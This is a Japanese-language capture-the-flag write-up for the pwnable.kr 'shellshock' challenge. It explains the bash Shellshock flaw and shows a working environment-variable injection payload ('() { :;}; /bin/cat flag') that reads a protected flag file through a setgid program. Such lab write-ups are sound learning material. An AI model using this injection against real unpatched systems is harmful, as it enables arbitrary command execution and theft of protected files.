# 内容
shellshockという名称の脆弱性を用いる問題。
まず、ログインしてみる。

```bash
ssh shellshock@pwnable.kr -p2222
shellshock@pwnable.kr's password:
 ____  __    __  ____    ____  ____   _        ___      __  _  ____
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|

- Site admin : daehee87.kr@gmail.com
- IRC : irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
Last login: Thu Jul 25 21:29:26 2019 from 101.7.158.247
shellshock@prowl:~$ ls
bash  flag  shellshock  shellshock.c
shellshock@prowl:~$ ls -la
total 980
drwxr-x---   5 root shellshock       4096 Oct 23  2016 .
drwxr-xr-x 114 root root             4096 May 19 15:59 ..
-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
d---------   2 root root             4096 Oct 12  2014 .bash_history
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi
drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
shellshock@prowl:~$ ./bash
shellshock@prowl:~$ exit
exit
shellshock@prowl:~$ ./shellshock
shock_me
shellshock@prowl:~$ cat flag
cat: flag: Permission denied
shellshock@prowl:~$ cat ./shellshock.c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}

shellshock@prowl:~$
```

この問題は知らなとできない。
この問題はshellshockと呼ばれる脆弱性**CVE-2014-7169**の問題で、
bashで任意のコードを実行できる脆弱性らしい。

問題は環境変数で関数を定義した後、コマンドを実行すると起きる。
例えば以下である。

```bash
env f='() { :;}; echo test' ./bash -c "echo a"
test
a
```

このスクリプトを分解すると、以下のようになる

1. 環境変数に関数を定義する
  * env f='() { :;};'
2. 関数の続きで適当なコマンドを打つ。今回はechoコマンド
  * env f='() { :;}; echo test'
3. bashを実行する。
  * env f='() { :;}; echo test' ./bash -c "echo a"

まず、bashコマンドを実行すると、環境変数を読み込む仕様であることは知られていると思う(関数も環境変数に定義できる)。
つまり、最初に定義した関数を読み込むことになる。

しかし、ここで問題になってくるのがbashの脆弱性。
環境変数を読み込むのはいいが、関数を読み込み、さらにその先のコマンドも読み込んでしまう。
つまり、関数の次に任意のコマンドを入れれることになってしまう。
そのため、今回はcatコマンドを使いflagをゲットしようという算段である。

# 解答
```bash
env f='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
```

フラグゲット。
